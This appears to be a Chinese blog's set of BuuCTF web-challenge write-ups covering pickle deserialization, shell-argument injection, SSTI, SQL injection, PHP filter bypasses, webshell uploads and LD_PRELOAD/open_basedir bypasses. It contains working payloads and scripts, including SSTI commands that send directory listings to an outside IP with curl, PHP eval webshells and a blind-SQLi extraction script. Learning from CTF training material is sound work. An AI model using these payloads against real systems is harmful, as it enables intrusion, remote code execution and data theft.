当序列化以及反序列化的过程中中碰到一无所知的扩展类型( python2,这里指的就是新式类)的时候，可以通过类中定义的 reduce 方法来告知如何进行序列化或者反序列化也就是说我们，只要在新式类中定义一个reduce 方法，我们就能在序列化的使用让这个类根据我们在 reduce 中指定的方式进行序列化 脚本如下 12345678910import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",))a = pickle.dumps(payload())a = urllib.quote(a)print a 先点击成为大会员的按钮 然后将抓到的post包的become参数改为脚本的输出就可以了 关于具体的pickle反序列化可以参考 python pickle反序列漏洞 [BUUCTF 2018]Online Tool主要参考 https://althims.com/2019/07/25/buu-online-tool-wp/ https://tiaonmmn.github.io/2019/09/08/BUUOJ%E5%88%B7%E9%A2%98-Web-Online-Tool/ 标准的RCE题目, 而且可以看到两个比较特别的函数 分别查一下手册 有意思的是这个中文居然还有儿化音hhh 那么来分析一下, 直接用payload来做解释 1&apos; &lt;?php phpinfo();?&gt; -oG shell.php 首先这个payload会经过escapeshellarg, 这个函数有以下三个步骤 对单引号进行转义 1\\&apos; &lt;?php phpinfo();?&gt; -oG shell.php 将转义的单引号用单引号包裹起来 1&apos;\\&apos;&apos; &lt;?php phpinfo();?&gt; -oG shell.php 将整个语句用单引号包裹起来 1&apos;&apos;\\&apos;&apos; &lt;?php phpinfo();?&gt; -oG shell.php &apos; 然后经过escapeshellcmd, 这个函数的步骤如下 在以下字符前面加入转义符, 在win下所有这些字符以及 % 和 ! 字符都会被空格代替, 不过实测发现是被^代替 1&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\\, \\x0A, \\xFF linux ![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214001604.png) win 匹配单引号数量(包括被\\转义的), 如果是奇数则转义最后一个单引号, 如果是偶数则不转义 1&apos;&apos;\\&apos;&apos; &lt;?php phpinfo();?&gt; -oG shell.php &apos; 则会变成 1&apos;&apos;\\&apos;&apos; &lt;?php phpinfo();?&gt; -oG shell.php \\&apos; 如果是 1&apos;&apos;\\&apos;&apos;&apos; &lt;?php phpinfo();?&gt; -oG shell.php &apos; 则不会转义 当然在实际中, 语句的中间部分也会被转义, 结果如下 可以看到前面的&#39;&#39;\\\\&#39;&#39;已经闭合, 中间的部分则会写入到shell.php中, 而为了避免最后出现的单引号来影响文件名, 我们需要在payload的最后加一个, 在url中需要写成%20, 不然会被浏览器自动忽略 最终payload如下 123&apos; &lt;?php echo `cat /flag`;?&gt; -oG shell.php # 或者&apos; &lt;?php echo `cat /flag`;?&gt; -oG shell.php &apos; 然后访问即可 [BJDCTF2020]Easy MD5 MD5($password, true) 123ffifdyop# or129581926211651571912466741651878684928 === 1param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 [BJDCTF2020]The mystery of ip模板注入, 读了下源码 123456789101112if (!empty($_SERVER['HTTP_CLIENT_IP'])) &#123; $ip=$_SERVER['HTTP_CLIENT_IP'];&#125;elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];&#125;else&#123; $ip=$_SERVER['REMOTE_ADDR'];&#125; 获取ip的方式如上, 我们只要随便选一个填写注入代码就可以了 我用的是client-ip [极客大挑战 2019]BabySQL双写绕过 [ASIS 2019]Unicorn shop参考 https://shawroot.hatenablog.com/entry/2019/10/29/ASIS_2019-Unicorn_shop 随便买个东西会发现报错 这个有点迷惑, 查了下好像是环境的问题, 如果改动price会有另外一个错误 提示我们需要用一个char来表示数字, 结合题目的unicorn, 应该指的是unicode, 可以在这个网址找到 并且我们可以看到有些字符会有一个Numeric Value的值, 这就可以用来转换了, 像这样找到一个大于1337(最贵的item)的值就可以了 [RoarCTF 2019]Easy Calc123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET['num']))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $str)) &#123; die(\"what are you want to do?\"); &#125; &#125; eval('echo '.$str.';');&#125;?&gt; 源码很简单, 只需要将需要绕过的地方用chr()表示就可以了, 但是这里有个waf, 当时一直绕不过去, 看了wp才知道, 在php解析变量的时候, 会替换空白符, 也就是说在php中 1?num=1 和 1?%20num=1 是一样的, 但是对于其他的语言并不一定, 所以可以通过这样的方法来绕过waf 那么payload如下 121;var_dump(scandir(chr(47))); // ls1;readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)); // /f1agg","link":"/2020/02/14/BuuCTF刷题记录/"},{"title":"BuuCTF刷题记录2","text":"感谢glzjin师傅 [WesternCTF2018]shrine首先看题目 1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) WAF只有过滤()和设置config以及self为空, 而我们可以看到flag在app.config里面, 这里参考 https://www.jianshu.com/p/1237c78a691c 没有了直接的config, 我们可以通过current_app来获取, 通过查阅手册, 可以发现在函数url_for中存在这个变量 那么就可以通过下面的payload来获取 1&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config&#125;&#125; 同样的函数还有get_flashed_messages 或者使用 1&#123;&#123;app.__init__.__globals__.sys.modules.app.app.__dict__&#125;&#125; 国外大佬的方法就比较硬核了 https://ctftime.org/writeup/10851 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# search.pydef search(obj, max_depth): visited_clss = [] visited_objs = [] def visit(obj, path='obj', depth=0): yield path, obj if depth == max_depth: return elif isinstance(obj, (int, float, bool, str, bytes)): return elif isinstance(obj, type): if obj in visited_clss: return visited_clss.append(obj) print(obj) else: if obj in visited_objs: return visited_objs.append(obj) # attributes for name in dir(obj): if name.startswith('__') and name.endswith('__'): if name not in ('__globals__', '__class__', '__self__', '__weakref__', '__objclass__', '__module__'): continue attr = getattr(obj, name) yield from visit(attr, '&#123;&#125;.&#123;&#125;'.format(path, name), depth + 1) # dict values if hasattr(obj, 'items') and callable(obj.items): try: for k, v in obj.items(): yield from visit(v, '&#123;&#125;[&#123;&#125;]'.format(path, repr(k)), depth) except: pass # items elif isinstance(obj, (set, list, tuple, frozenset)): for i, v in enumerate(obj): yield from visit(v, '&#123;&#125;[&#123;&#125;]'.format(path, repr(i)), depth) yield from visit(obj) 修改的app.py 123456789101112131415161718192021import flaskimport osfrom flask import requestfrom search import searchapp = flask.Flask(__name__)app.config['FLAG'] = 'TWCTF_FLAG'@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): for path, obj in search(request, 10): if str(obj) == app.config['FLAG']: return pathif __name__ == '__main__': app.run(debug=True) 通过遍历request来查找是否存在某个子属性和app.config[&#39;FLAG&#39;]是一致的, 最后找的payload是 1&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&apos;json&apos;].JSONEncoder.default.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125; 其实可以看到和前面的思路是一致的, 只是获取的路径不同 [GWCTF 2019]你的名字顺带就来做一下上次比赛没整出来的SSTI 这道题其实很明显的是模板注入, 出题人恶趣味的用了index.php这样的路由, 但是实际上还是一道python题 先来fuzz一下 当输入为class的时候, 结果会被过滤, 应该是有waf 用6测一下发现还有php的报错, 这是真的sxbk 但是这里是用不了了 我们上网查一下就会发现, 在ssti中过滤了后, 可以通过{\\%外带 Python模板注入(SSTI)深入学习 上面链接中的payload改一下就可以用 1&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;curl http://xx.xxx.xx.xx:8080/?i=`ls /`&apos;) %&#125;1&#123;% endif %&#125; 但是还有一个问题是有关键字符的过滤, 上网找一下ssti的字典 当然是没找到了 可以发现双写绕不过, 应该是循环匹配, 替换为空的话我们可以利用这个特点来绕过, 但是这里毫无提示, 感觉只能纯靠猜, 找到一个词符合以下条件 在ban_list中尽量靠后 不出现在我们的payload里面 由于第一个是黑箱, 我们只能从第二个入手 fuzz脚本 12345678910111213141516171819202122232425262728293031323334353637import reimport requestsfrom time import sleepurl = \"http://f9fd3c30-c575-4a29-88a3-680ebc168df5.node3.buuoj.cn\"def gen_words(): f = open(\"ssti_payload.txt\", \"r\").read() words = re.findall(\"[a-zA-Z]+\", f) f = open(\"ssti_word.txt\", \"w\") res = sorted(list(set(words))) for i in res: f.write(i + \"\\n\") return resdef find_unused_word(words, payload): used_word = list(set(re.findall(\"[a-zA-Z]+\", payload))) return [i for i in words if i not in used_word]def fuzz(): payload = \"&#123;% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`ls /`') %&#125;1&#123;% endif %&#125;\" words = gen_words() unused_word = find_unused_word(words, payload) for i in unused_word: data = &#123; \"name\": i &#125; res = requests.post(url, data=data).text if \"hello !\" in res: data = &#123; \"name\": \"cla\" + i + \"ss\" &#125; res = requests.post(url, data=data).text if \"class\" in res: print(f\"[*] find &#123;i&#125;\") sleep(0.1)if __name__ == \"__main__\": fuzz() 由于结果只有几个, 我们挨个试一下, 就会发现config是可用的 使用小号开一个Linux labs 之后再改造一下payload 1&#123;% iconfigf &apos;&apos;.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen(&apos;curl http://174.0.167.222:2333/ -d `ls /|base64`&apos;) %&#125;1&#123;% endiconfigf %&#125; 注意这里最后必须要是endiconfigf, 不是很懂为什么, 猜测是要和前面的iconfigf一致吧, 其他的情况都会导致打不通 然后我们就可以rce了, 由于返回只有一行, 就拼接了个|base64 [SWPU2019]Web1这题咋一看还以为是个XSS—- 但是这管理员一直不确认的就很迷惑了 然后查了一下才发现不是XSS是个SQL题 可以看到注入点有几个, 比如申请广告这里 还有查看的时候 测试一下发现id那里打不通, 就回到广告这里, 顺利的看到了注入点 当然这丧心病狂的22列是真的顶 首先可以看到被过滤, 直接使用/**/或者(就可以绕过了, 主要是下面两点 Bypass information_schema做过sqli的都知道这个库的厉害, 但是现在也经常被过滤 (例如过滤or), 那么我们就需要新的姿势了 https://www.anquanke.com/post/id/193512 https://www.cnblogs.com/wangtanzhi/p/12241499.html 可以看到大部分是用了sys.schema_auto_increment_columns这个库 由于在Buuoj上面没有这个库, 这里用的姿势是 1-1&apos;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22 这样来获取表名 无列名注入先回顾一下我们常规的思路, 一般我们是通过information_schema.columns注入出所有列名再进行查询, 而这里我们用不了这个库, 就可以考虑无列名注入 1select 1,2,3; 此时可以看到列名分别为1,2,3 1select 1,2,3 union select * from users; 这里可以看到我们通过union连接来改变原来的列名, 所以我们可以通过 1select `2` from (select 1,2,3 union select * from users)x; 这里有几个注意的点 列名用反引号, 这里因为是数字, 我们需要使用反引号包起来, 如果不用的话会全部变成2 子select要用()包起来 子select最后要赋予一个别名, 不然会报错 然后我们就可以注入了 12-1&apos;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22 我现在才发现select*from users是成立的, 中间不需要用空格…. 然后就可以拿flag了 [CISCN 2019 初赛]Love Math这道题蛮有意思的, 先看代码 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c']))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) &#123; die(\"太长了不会算\"); &#125; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $content)) &#123; die(\"请不要输入奇奇怪怪的字符\"); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(\"请不要输入奇奇怪怪的函数\"); &#125; &#125; //帮你算出答案 eval('echo '.$content.';');&#125; 代码中做了三个判断 长度必须小于80 过滤一部分符号 1&apos; &apos;, &apos;\\t&apos;, &apos;\\r&apos;, &apos;\\n&apos;,&apos;\\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\\[&apos;, &apos;\\]&apos; 匹配所有函数变量名必须在$whitelist中, 比如pi 这个正则来源可以见 https://www.php.net/manual/zh/language.variables.basics.php 其实第一个是最难的hhhh 看一下手册就可以看到, 有个函数很特别 这个返回值是string就很妙了, 那么我们可以通过这样的方法来转换出我们需要的字符 123$command = \"phpinfo\";echo base_convert($command,36,10);# &gt;:55490343972 这样就能得到一个纯数字, 然后通过 1base_convert(55490343972,10,36)(); 就可以执行了 然后同理我们可以拼出 12base_convert(1751504350,10,36)(base_convert(784,10,36));# system(ls) 但是读文件就比较困难了, base_convert只能转换[a-z0-9], 而读文件需要空格, 本题的flag在/flag, 那就势必需要能够转换特殊字符的函数了, 这里有两个思路 hex2bin先看一下手册 这个函数可以实现将Hex转换成字符串, 也就是 但是这样会出现字母, 本地先转换成10进制, 然后在payload使用dechex转换回去就可以了, 具体操作如下 123base_convert(696468,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))# system(hex2bin(dechex(1819484207)))# system(&apos;ls /&apos;) 当然想法很好, 长度却不够了, 这里的替换思路有两个, 一个是将system换成exec, 并更改进制来尽量减少位数, 只要不出现字母就可以了 12base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(1819484207)))# exec(&apos;ls /&apos;) 刚好79, 可以执行 但是没有全部返回hhh, 这里知道是在/flag, 就可以直接打, 不过命令也是比较取巧 12base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260451114)))# exec(&apos;nl /*&apos;) 另外一种就是构造$_GET, 然后就可以为所欲为了hhhh 1234$pi=base_convert(3761671484,13,36)(dechex(1598506324));$$pi&#123;0&#125;($$pi&#123;1&#125;)# $pi=hex2bin(dechex(1598506324));# $pi=_GET# $$pi=$_GET 这里利用的是php的可变变量特性 剩下的就显而易见了 从其他位置获取参数可以在 https://xz.aliyun.com/t/4906#toc-8 中看到ROIS使用的payload是 12$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))()&#123;9&#125;)# system(getallheaders()&#123;9&#125;) 实测的时候一直没有打通, 研究了一下发现这个payload需要在apache环境下 buu上是用nginx, 所以打不通, 其他的类似函数因为长度问题用不了, 就当了解一下了 [极客大挑战 2019]RCE ME参考 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 这个过滤的话很明显就能想到p神上面那篇文章, 直接取反就可以绕过了, 然后我们想办法执行, 先看一下phpinfo() 1(~%8F%97%8F%96%91%99%90)(); 然后是disable_function 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl 可以看到mail没有被禁, 那么我们待会就可以用来绕过 这里的话我们只能够拼接assert而不能拼接eval, 这是由php的特性决定的 然后看一下环境是在Apache下, 那么有一说一还是getallheaders舒服 参考 https://evoa.me/index.php/archives/62/ 12(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));# assert(next(getallheaders())); 然后在User-Agent输入命令即可 为了Bypass disable_function, 先让蚁剑连上来, 写shell 1User-Agent: print_r(file_put_contents(&quot;/tmp/a.php&quot;,&apos;&lt;?php eval($_POST[c]);?&gt;&apos;)) 然后包含 1User-Agent: include(&quot;/tmp/a.php&quot;); 蚁剑就可以连上来了 这里先提供一个懒人方法 使用蚁剑的插件 就可以直接绕过了hhh, 当然我们不能这样, 还是要一步一步来 推荐以下两篇文章 https://www.anquanke.com/post/id/175403 https://www.freebuf.com/articles/web/192052.html 无论学什么都能在一叶飘零师傅的文章中找到.jpg 我们知道如果要加载LD_PRELOAD需要新起进程, 在php解释器运行中, 第一次执行execve是调用php解释器, 如果出现第二个execve就是有新进程的生成, 这里的测试php如下 12&lt;?php mail(&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;); 然后使用命令 1strace -f php test.php 2&gt;&amp;1|grep -C3 execve 可以看到确实出现了多个execve, 同样的函数还有imap_open 这里我就直接使用了前面链接中的文件 首先是exp.c 123456789101112131415161718192021222324252627#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void)&#123; // get command line options and arg const char* cmdline = getenv(\"EVIL_CMDLINE\"); // unset environment variable LD_PRELOAD. // unsetenv(\"LD_PRELOAD\") no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) &#123; if (strstr(environ[i], \"LD_PRELOAD\")) &#123; environ[i][0] = '\\0'; &#125; &#125; // executive command system(cmdline);&#125; 在linux中编译 1gcc -shared -fPIC exp.c -o exp_x64.so exp.php 12345678910111213141516171819&lt;?php echo \"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;\"; $cmd = $_GET[\"cmd\"]; $out_path = $_GET[\"outpath\"]; $evil_cmdline = $cmd . \" &gt; \" . $out_path . \" 2&gt;&amp;1\"; echo \"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: \" . $evil_cmdline . \"&lt;/p&gt;\"; putenv(\"EVIL_CMDLINE=\" . $evil_cmdline); $so_path = $_GET[\"sopath\"]; putenv(\"LD_PRELOAD=\" . $so_path); mail(\"\", \"\", \"\", \"\"); echo \"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;\" . nl2br(file_get_contents($out_path)) . \"&lt;/p&gt;\"; unlink($out_path);?&gt; 然后通过蚁剑一起上传上去, 带上参数访问即可 不用蚁剑的话可以通过开另一台linux_lab来传 1copy(&quot;http://ip:port/exp.so&quot;,&quot;/tmp/exp.so&quot;); 方法很多, 蚁剑是比较方便的方法 [SUCTF 2019]EasyWeb源码如下 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpfunction get_the_flag()&#123; // webadmin will remove your upload file every 20 min!!!! $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[\"file\"]))&#123; $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $name = $_FILES[\"file\"][\"name\"]; $extension = substr($name, strrpos($name,\".\")+1); if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(\"^_^\"); if(!exif_imagetype($tmp_name)) die(\"^_^\"); $path= $userdir.\"/\".$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125;&#125;$hhh = @$_GET['_'];if (!$hhh)&#123; highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123; die('One inch long, one inch strong!');&#125;if ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&amp;.,|=[\\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(\"Almost there!\");eval($hhh);?&gt; 绕过正则首先有长度和正则的过滤, 我们需要先想办法构造一个$_GET出来, fuzz一下特殊符号, 发现还有^, 那大概就是异或来绕过正则了, 而我们在下面还可以看到有个 1$character_type = count_chars($hhh, 3); 也就是说我们不能使用超过12种字符 那先用脚本构造一下 1234567891011121314151617181920import repattern = re.compile('[\\x00- 0-9A-Za-z\\'\"\\`~_&amp;.,|=[\\x7F]+', re.I)payload = \"_GET\"for i in range(1, 256): if pattern.match(chr(i)): continue res = f\"%&#123;i:02x&#125;\" * len(payload) res += \"^\" f = False for j in payload: new = ord(j)^i if pattern.match(chr(new)): f = True break res += f\"%&#123;ord(j)^i:02x&#125;\" if f: continue print(res) 然后从输出中随便选一个来构造 1$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo 文件上传这里其实就是让你去调用get_the_flag() 那么我们来康康这个函数干啥 1234567891011121314function get_the_flag()&#123; ... if(!empty($_FILES[\"file\"]))&#123; $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $name = $_FILES[\"file\"][\"name\"]; $extension = substr($name, strrpos($name,\".\")+1); if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(\"^_^\"); if(!exif_imagetype($tmp_name)) die(\"^_^\"); $path= $userdir.\"/\".$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125;&#125; 其实很平淡, 我们简单分析一下 /ph/i的后缀过滤, 平时常见的php文件类型都不能用, 要么是asp, jsp这些或者是利用.htaccess来解析不常见类型 &lt;?检测, 由于我们前面可以看到php的版本为7.2, 之前的&lt;script的绕过就不能用了, 不过这也是个旧的知识点, base64 or utf-7即可 exif_imagetype图像类型检测, 这个网上有很多绕过的方案了, 例如 1234# xbm formatSIZE_HEADER = b&quot;#define width 1\\n#define height 1\\n\\n&quot;# wbmp formatSIZE_HEADER = b&quot;\\x00\\x00\\x8a\\x39\\x8a\\x39&quot; 在.htaccess中, #和\\x00是注释符, 因此上面两个文件头不会影响文件的正常功能 然后在shell中, 需要注意的是由于使用了base64解码, 我们需要保证文件头前面是4的倍数, 这样才不会影响后面代码的解码(这里补上了00) https://www.jianshu.com/p/fbfeeb43ace2 12345678910111213141516171819202122232425import requestsimport base64url = r\"http://2eab5f94-4cfd-41dc-ac5d-6cda977d7ce4.node3.buuoj.cn//?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag\"SIZE_HEADER = b\"\\x00\\x00\\x8a\\x39\\x8a\\x39\"htaccess = SIZE_HEADER + b\"\"\"AddType application/x-httpd-php .ccphp_value auto_prepend_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc\"\"\"\"files = [ (\"file\",(\".htaccess\", htaccess, \"image/gif\"))]proxy = &#123;\"http\": \"127.0.0.1:8080\"&#125;res = requests.post(url, files=files, proxies=proxy).textprint(res)shell = SIZE_HEADER + b\"00\" + base64.b64encode(b\"&lt;?php eval($_GET['cjm00n']);?&gt;\")files = [ (\"file\",(\"shell.cc\", shell, \"image/gif\"))]proxy = &#123;\"http\": \"127.0.0.1:8080\"&#125;res = requests.post(url, files=files, proxies=proxy).textprint(res) Bypass open_dir推荐一篇很详细的文章 浅谈几种Bypass-open-basedir的方法 以及这篇 https://xz.aliyun.com/t/4720 从源码分析payload 这里就直接放payload了 123chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(scandir(&quot;/&quot;));# ormkdir(&apos;cjm00n&apos;);chdir(&apos;cjm00n&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(scandir(&quot;/&quot;)); 1chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(readfile(&apos;/THis_Is_tHe_F14g&apos;)); [CISCN2019 总决赛 Day2 Web1]Easyweb我们可以在robots.txt中发现有备份文件, 可以下载到image.php.bak, 看一下源码 12345678910111213141516171819&lt;?phpinclude \"config.php\";$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);echo $id.\" \".$path;$result=mysqli_query($con,\"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'\");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=\"./\" . $row[\"path\"];header(\"Content-Type: image/jpeg\");readfile($path); sql注入无疑, 可以看到有addslashes函数 假如我们输入 1\\0&apos; 经过这个函数后会变成 1\\\\0\\&apos; 经过替换后就只剩下 1\\ 回到sql语句中 1select * from images where id=&apos;\\&apos; or path=&apos;&#123;$path&#125;&apos; &#39;号被成功转义, 那还不是为所欲为 这里我们使用布尔盲注, 脚本如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import requestsfrom time import sleepurl = \"http://abaa0b80-e625-4b62-81d0-92b0987742d0.node3.buuoj.cn/image.php\"# url = \"http://local:2333/image.php\"proxies = &#123; \"http\": \"127.0.0.1:8080\"&#125;def attack(cur, mid=\"\"): # payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,0)\" % (cur, mid) # payload = \" or length((select group_concat(password) from users))=&#123;&#125;#\".format(cur) # 一开始把#写成%23, 结果一直不对, 后面才想起python会自动编码... payload = \" or if(ascii(substr((select group_concat(password) from users),%d,1))&gt;%d,1,0)#\" % (cur, mid) data = &#123; \"id\": \"\\\\0'\", \"path\": payload &#125; res = requests.get(url, params=data, proxies=proxies) if res.status_code == 429: print('too fast') if \"JFIF\" in res.text: return True else: return Falsedef try_length(): for i in range(18, 25): if attack(i): print(i) break sleep(0.02)def main(): flag = \"\" for i in range(1, 22): end = 127 start = 31 mid = (end + start) // 2 while end &gt; start: if attack(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.02) flag += chr(mid) print(flag)if __name__ == \"__main__\": # try_length() main() 然后就能注出密码 登陆后可以看到有个文件上传点 上传后提示会记录文件名, 并且log文件为php格式, 但是由于存在/php/i的过滤, 使用短标签绕过 1&lt;?=system($_GET[c]);?&gt; 后面就直接cat /flag [HITCON 2017]SSRFme12345678910111213141516171819&lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); $_SERVER['REMOTE_ADDR'] = $http_x_headers[0]; &#125; echo $_SERVER[\"REMOTE_ADDR\"]; $_SERVER['REMOTE_ADDR'] = '113.101.89.250'; $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"])); $info = pathinfo($_GET[\"filename\"]); $dir = str_replace(\".\", \"\", basename($info[\"dirname\"])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[\"basename\"]), $data); highlight_file(__FILE__); 代码很短, 一眼可以看到有行 1$data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"])); 本地测的时候不能运行 查了一下发现是perl, 说来这道题是不是buuoj上面的配置不对, 这里我用的是data协议直接做 1?url=data://baidu.com,base64,&lt;?eval($_GET[c]);?&gt;&amp;filename=test.php 